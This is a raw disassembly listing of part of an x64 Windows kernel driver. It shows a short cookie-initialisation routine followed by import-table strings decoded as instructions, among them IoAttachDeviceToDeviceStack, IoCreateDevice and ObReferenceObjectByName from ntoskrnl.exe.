   140005057:	48 0b c2             	or     %rdx,%rax
   14000505a:	48 33 c1             	xor    %rcx,%rax
   14000505d:	48 89 05 9c df ff ff 	mov    %rax,-0x2064(%rip)        # 0x140003000
   140005064:	66 44 89 0d 9a df ff 	mov    %r9w,-0x2066(%rip)        # 0x140003006
   14000506b:	ff 
   14000506c:	48 8b 05 8d df ff ff 	mov    -0x2073(%rip),%rax        # 0x140003000
   140005073:	48 85 c0             	test   %rax,%rax
   140005076:	75 0a                	jne    0x140005082
   140005078:	49 8b c0             	mov    %r8,%rax
   14000507b:	48 89 05 7e df ff ff 	mov    %rax,-0x2082(%rip)        # 0x140003000
   140005082:	48 f7 d0             	not    %rax
   140005085:	48 89 05 7c df ff ff 	mov    %rax,-0x2084(%rip)        # 0x140003008
   14000508c:	c3                   	ret
   14000508d:	cc                   	int3
   14000508e:	cc                   	int3
   14000508f:	cc                   	int3
   140005090:	b8 50 00 00 00       	mov    $0x50,%eax
   140005095:	00 00                	add    %al,(%rax)
   140005097:	00 00                	add    %al,(%rax)
   140005099:	00 00                	add    %al,(%rax)
   14000509b:	00 86 52 00 00 00    	add    %al,0x52(%rsi)
   1400050a1:	20 00                	and    %al,(%rax)
	...
   1400050b7:	00 40 51             	add    %al,0x51(%rax)
   1400050ba:	00 00                	add    %al,(%rax)
   1400050bc:	00 00                	add    %al,(%rax)
   1400050be:	00 00                	add    %al,(%rax)
   1400050c0:	4c 51                	rex.WR push %rcx
   1400050c2:	00 00                	add    %al,(%rax)
   1400050c4:	00 00                	add    %al,(%rax)
   1400050c6:	00 00                	add    %al,(%rax)
   1400050c8:	5a                   	pop    %rdx
   1400050c9:	51                   	push   %rcx
   1400050ca:	00 00                	add    %al,(%rax)
   1400050cc:	00 00                	add    %al,(%rax)
   1400050ce:	00 00                	add    %al,(%rax)
   1400050d0:	6e                   	outsb  (%rsi),(%dx)
   1400050d1:	51                   	push   %rcx
   1400050d2:	00 00                	add    %al,(%rax)
   1400050d4:	00 00                	add    %al,(%rax)
   1400050d6:	00 00                	add    %al,(%rax)
   1400050d8:	88 51 00             	mov    %dl,0x0(%rcx)
   1400050db:	00 00                	add    %al,(%rax)
   1400050dd:	00 00                	add    %al,(%rax)
   1400050df:	00 9e 51 00 00 00    	add    %bl,0x51(%rsi)
   1400050e5:	00 00                	add    %al,(%rax)
   1400050e7:	00 bc 51 00 00 00 00 	add    %bh,0x0(%rcx,%rdx,2)
   1400050ee:	00 00                	add    %al,(%rax)
   1400050f0:	cc                   	int3
   1400050f1:	51                   	push   %rcx
   1400050f2:	00 00                	add    %al,(%rax)
   1400050f4:	00 00                	add    %al,(%rax)
   1400050f6:	00 00                	add    %al,(%rax)
   1400050f8:	e2 51                	loop   0x14000514b
   1400050fa:	00 00                	add    %al,(%rax)
   1400050fc:	00 00                	add    %al,(%rax)
   1400050fe:	00 00                	add    %al,(%rax)
   140005100:	f4                   	hlt
   140005101:	51                   	push   %rcx
   140005102:	00 00                	add    %al,(%rax)
   140005104:	00 00                	add    %al,(%rax)
   140005106:	00 00                	add    %al,(%rax)
   140005108:	06                   	(bad)
   140005109:	52                   	push   %rdx
   14000510a:	00 00                	add    %al,(%rax)
   14000510c:	00 00                	add    %al,(%rax)
   14000510e:	00 00                	add    %al,(%rax)
   140005110:	18 52 00             	sbb    %dl,0x0(%rdx)
   140005113:	00 00                	add    %al,(%rax)
   140005115:	00 00                	add    %al,(%rax)
   140005117:	00 28                	add    %ch,(%rax)
   140005119:	52                   	push   %rdx
   14000511a:	00 00                	add    %al,(%rax)
   14000511c:	00 00                	add    %al,(%rax)
   14000511e:	00 00                	add    %al,(%rax)
   140005120:	3e 52                	ds push %rdx
   140005122:	00 00                	add    %al,(%rax)
   140005124:	00 00                	add    %al,(%rax)
   140005126:	00 00                	add    %al,(%rax)
   140005128:	56                   	push   %rsi
   140005129:	52                   	push   %rdx
   14000512a:	00 00                	add    %al,(%rax)
   14000512c:	00 00                	add    %al,(%rax)
   14000512e:	00 00                	add    %al,(%rax)
   140005130:	70 52                	jo     0x140005184
	...
   14000513e:	00 00                	add    %al,(%rax)
   140005140:	59                   	pop    %rcx
   140005141:	00 44 62 67          	add    %al,0x67(%rdx,%riz,2)
   140005145:	50                   	push   %rax
   140005146:	72 69                	jb     0x1400051b1
   140005148:	6e                   	outsb  (%rsi),(%dx)
   140005149:	74 00                	je     0x14000514b
   14000514b:	00 5a 00             	add    %bl,0x0(%rdx)
   14000514e:	44 62 67 50 72 69    	(bad)
   140005154:	6e                   	outsb  (%rsi),(%dx)
   140005155:	74 45                	je     0x14000519c
   140005157:	78 00                	js     0x140005159
   140005159:	00 20                	add    %ah,(%rax)
   14000515b:	04 4b                	add    $0x4b,%al
   14000515d:	65 49 6e             	rex.WB outsb %gs:(%rsi),(%dx)
   140005160:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   140005167:	65 
   140005168:	45 76 65             	rex.RB jbe 0x1400051d0
   14000516b:	6e                   	outsb  (%rsi),(%dx)
   14000516c:	74 00                	je     0x14000516e
   14000516e:	ee                   	out    %al,(%dx)
   14000516f:	03 4b 65             	add    0x65(%rbx),%ecx
   140005172:	44                   	rex.R
   140005173:	65 6c                	gs insb (%dx),(%rdi)
   140005175:	61                   	(bad)
   140005176:	79 45                	jns    0x1400051bd
   140005178:	78 65                	js     0x1400051df
   14000517a:	63 75 74             	movsxd 0x74(%rbp),%esi
   14000517d:	69 6f 6e 54 68 72 65 	imul   $0x65726854,0x6e(%rdi),%ebp
   140005184:	61                   	(bad)
   140005185:	64 00 00             	add    %al,%fs:(%rax)
   140005188:	a9 04 4b 65 53       	test   $0x53654b04,%eax
   14000518d:	65 74 50             	gs je  0x1400051e0
   140005190:	72 69                	jb     0x1400051fb
   140005192:	6f                   	outsl  (%rsi),(%dx)
   140005193:	72 69                	jb     0x1400051fe
   140005195:	74 79                	je     0x140005210
   140005197:	54                   	push   %rsp
   140005198:	68 72 65 61 64       	push   $0x64616572
   14000519d:	00 75 02             	add    %dh,0x2(%rbp)
   1400051a0:	49 6f                	rex.WB outsl (%rsi),(%dx)
   1400051a2:	41 74 74             	rex.B je 0x140005219
   1400051a5:	61                   	(bad)
   1400051a6:	63 68 44             	movsxd 0x44(%rax),%ebp
   1400051a9:	65 76 69             	gs jbe 0x140005215
   1400051ac:	63 65 54             	movsxd 0x54(%rbp),%esp
   1400051af:	6f                   	outsl  (%rsi),(%dx)
   1400051b0:	44                   	rex.R
   1400051b1:	65 76 69             	gs jbe 0x14000521d
   1400051b4:	63 65 53             	movsxd 0x53(%rbp),%esp
   1400051b7:	74 61                	je     0x14000521a
   1400051b9:	63 6b 00             	movsxd 0x0(%rbx),%ebp
   1400051bc:	ad                   	lods   (%rsi),%eax
   1400051bd:	03 49 6f             	add    0x6f(%rcx),%ecx
   1400051c0:	66 43 61             	data16 rex.XB (bad)
   1400051c3:	6c                   	insb   (%dx),(%rdi)
   1400051c4:	6c                   	insb   (%dx),(%rdi)
   1400051c5:	44 72 69             	rex.R jb 0x140005231
   1400051c8:	76 65                	jbe    0x14000522f
   1400051ca:	72 00                	jb     0x1400051cc
   1400051cc:	ae                   	scas   (%rdi),%al
   1400051cd:	03 49 6f             	add    0x6f(%rcx),%ecx
   1400051d0:	66 43 6f             	rex.XB outsw (%rsi),(%dx)
   1400051d3:	6d                   	insl   (%dx),(%rdi)
   1400051d4:	70 6c                	jo     0x140005242
   1400051d6:	65 74 65             	gs je  0x14000523e
   1400051d9:	52                   	push   %rdx
   1400051da:	65 71 75             	gs jno 0x140005252
   1400051dd:	65 73 74             	gs jae 0x140005254
   1400051e0:	00 00                	add    %al,(%rax)
   1400051e2:	95                   	xchg   %eax,%ebp
   1400051e3:	02 49 6f             	add    0x6f(%rcx),%cl
   1400051e6:	43 72 65             	rex.XB jb 0x14000524e
   1400051e9:	61                   	(bad)
   1400051ea:	74 65                	je     0x140005251
   1400051ec:	44                   	rex.R
   1400051ed:	65 76 69             	gs jbe 0x140005259
   1400051f0:	63 65 00             	movsxd 0x0(%rbp),%esp
   1400051f3:	00 ac 02 49 6f 44 65 	add    %ch,0x65446f49(%rdx,%rax,1)
   1400051fa:	6c                   	insb   (%dx),(%rdi)
   1400051fb:	65 74 65             	gs je  0x140005263
   1400051fe:	44                   	rex.R
   1400051ff:	65 76 69             	gs jbe 0x14000526b
   140005202:	63 65 00             	movsxd 0x0(%rbp),%esp
   140005205:	00 af 02 49 6f 44    	add    %ch,0x446f4902(%rdi)
   14000520b:	65 74 61             	gs je  0x14000526f
   14000520e:	63 68 44             	movsxd 0x44(%rax),%ebp
   140005211:	65 76 69             	gs jbe 0x14000527d
   140005214:	63 65 00             	movsxd 0x0(%rbp),%esp
   140005217:	00 14 06             	add    %dl,(%rsi,%rax,1)
   14000521a:	50                   	push   %rax
   14000521b:	6f                   	outsl  (%rsi),(%dx)
   14000521c:	43 61                	rex.XB (bad)
   14000521e:	6c                   	insb   (%dx),(%rdi)
   14000521f:	6c                   	insb   (%dx),(%rdi)
   140005220:	44 72 69             	rex.R jb 0x14000528c
   140005223:	76 65                	jbe    0x14000528a
   140005225:	72 00                	jb     0x140005227
   140005227:	00 5e 06             	add    %bl,0x6(%rsi)
   14000522a:	50                   	push   %rax
   14000522b:	6f                   	outsl  (%rsi),(%dx)
   14000522c:	53                   	push   %rbx
   14000522d:	74 61                	je     0x140005290
   14000522f:	72 74                	jb     0x1400052a5
   140005231:	4e                   	rex.WRX
   140005232:	65 78 74             	gs js  0x1400052a9
   140005235:	50                   	push   %rax
   140005236:	6f                   	outsl  (%rsi),(%dx)
   140005237:	77 65                	ja     0x14000529e
   140005239:	72 49                	jb     0x140005284
   14000523b:	72 70                	jb     0x1400052ad
   14000523d:	00 05 06 4f 62 66    	add    %al,0x66624f06(%rip)        # 0x1a662a149
   140005243:	44                   	rex.R
   140005244:	65 72 65             	gs jb  0x1400052ac
   140005247:	66 65 72 65          	data16 gs jb 0x1400052b0
   14000524b:	6e                   	outsb  (%rsi),(%dx)
   14000524c:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14000524f:	62 6a 65 63 74       	(bad)
   140005254:	00 00                	add    %al,(%rax)
   140005256:	f7 05 4f 62 52 65 66 	testl  $0x65726566,0x6552624f(%rip)        # 0x1a552b4af
   14000525d:	65 72 65 
   140005260:	6e                   	outsb  (%rsi),(%dx)
   140005261:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   140005264:	62 6a 65 63 74       	(bad)
   140005269:	42 79 4e             	rex.X jns 0x1400052ba
   14000526c:	61                   	(bad)
   14000526d:	6d                   	insl   (%dx),(%rdi)
   14000526e:	65 00 b5 02 49 6f 44 	add    %dh,%gs:0x446f4902(%rbp)
   140005275:	72 69                	jb     0x1400052e0
   140005277:	76 65                	jbe    0x1400052de
   140005279:	72 4f                	jb     0x1400052ca
   14000527b:	62 6a 65 63 74       	(bad)
   140005280:	54                   	push   %rsp
   140005281:	79 70                	jns    0x1400052f3
   140005283:	65 00 00             	add    %al,%gs:(%rax)
   140005286:	6e                   	outsb  (%rsi),(%dx)
   140005287:	74 6f                	je     0x1400052f8
   140005289:	73 6b                	jae    0x1400052f6
   14000528b:	72 6e                	jb     0x1400052fb
   14000528d:	6c                   	insb   (%dx),(%rdi)
   14000528e:	2e 65 78 65          	cs js,pn 0x1400052f7
	...
